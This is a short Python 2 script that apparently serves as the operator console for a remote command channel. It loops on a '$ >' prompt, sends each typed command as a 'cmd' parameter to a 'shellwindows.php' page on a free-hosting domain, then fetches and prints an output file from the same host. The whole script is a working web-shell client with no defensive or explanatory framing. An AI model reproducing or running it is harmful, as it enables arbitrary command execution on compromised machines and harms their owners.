import os
import requests
import json
import time
i=1
url= "https://webdevsblog.000webhostapp.com/shellwindows.php"
url1= "https://webdevsblog.000webhostapp.com/append1.txt"
while i>0:
	b = raw_input("$ >");
	par= {'cmd':b}
	r = requests.get(url, params=par)
	time.sleep(4)
	r1 = requests.get(url1)
	r1text = r1.text
	print r1text
